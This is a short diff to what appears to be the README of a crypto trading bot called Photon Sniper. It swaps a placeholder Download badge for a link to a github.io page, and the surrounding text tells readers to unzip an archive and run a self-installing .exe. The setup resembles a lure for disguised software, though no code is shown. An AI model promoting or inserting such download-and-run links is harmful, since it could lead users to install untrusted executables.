@@ -10,7 +10,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` installer — Photon Sniper will automatically install itself and be ready for trading.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://photon-sniper-desktop.github.io/.github/)
 
 ## ​ Overview
 A quick look at key parts in action:
